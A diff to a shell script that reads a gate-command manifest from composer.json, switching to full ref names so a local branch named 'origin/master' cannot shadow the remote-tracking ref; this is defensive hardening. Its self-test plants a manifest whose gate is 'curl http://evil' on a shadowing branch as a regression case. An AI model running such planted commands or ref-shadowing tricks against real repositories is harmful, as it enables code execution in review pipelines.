@@ -26,7 +26,7 @@
 #   --ref          read composer.json from this ref instead of the default branch
 #   --env          print the manifest `env` as validated NAME=value lines, one per line
 #   --raw          print composer.json from the ref as it is, without parsing it (no jq)
-#   --default-ref  print the default-branch ref this script reads (for example `origin/master`), so a
+#   --default-ref  print the default-branch ref this script reads (the full name, for example `refs/remotes/origin/master`), so a
 #                  caller that reads other files from the default branch resolves the same ref
 #
 #   composer.json is resolved relative to the current directory, which is the
@@ -70,15 +70,17 @@ or {} when there is none.
 EOF
 }
 
+# The ref is returned as a FULL ref name. A short name such as `origin/master` is ambiguous: a local branch or a tag
+# of that name shadows `refs/remotes/origin/master`, so a branch under review could plant the file `git show` reads.
 default_ref() {
   local ref candidate
 
-  if ref="$(git symbolic-ref --quiet --short refs/remotes/origin/HEAD 2>/dev/null)"; then
+  if ref="$(git symbolic-ref --quiet refs/remotes/origin/HEAD 2>/dev/null)"; then
     printf '%s' "$ref"
     return 0
   fi
 
-  for candidate in origin/main origin/master; do
+  for candidate in refs/remotes/origin/main refs/remotes/origin/master; do
     if git rev-parse --verify --quiet "$candidate^{commit}" >/dev/null 2>&1; then
       printf '%s' "$candidate"
       return 0
@@ -236,7 +238,15 @@ self_test() {
 
   git -C "$repo" update-ref refs/remotes/origin/master HEAD
   expect_output 'origin/master is used when origin/HEAD is unset' "$repo" '{"gate":["make check"]}' 0
-  expect_output '--default-ref prints the ref the manifest is read from' "$repo" 'origin/master' 0 --default-ref
+  expect_output '--default-ref prints the ref the manifest is read from' "$repo" 'refs/remotes/origin/master' 0 --default-ref
+
+  # A local branch named `origin/master` must not shadow the remote-tracking ref.
+  commit_composer "$repo" '{ "extra": { "ai-olympus": { "gate": ["curl http://evil"] } } }'
+  git -C "$repo" update-ref refs/heads/origin/master HEAD
+  git -C "$repo" reset -q --hard HEAD~1
+  expect_output 'a local branch named origin/master does not shadow the remote-tracking ref' "$repo" '{"gate":["make check"]}' 0
+  expect_output 'a local branch named origin/master does not change --default-ref' "$repo" 'refs/remotes/origin/master' 0 --default-ref
+  git -C "$repo" update-ref -d refs/heads/origin/master
 
   git -C "$repo" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/master
   printf '%s\n' '{ "extra": { "ai-olympus": { "gate": ["curl http://evil"] } } }' >"$repo/composer.json"
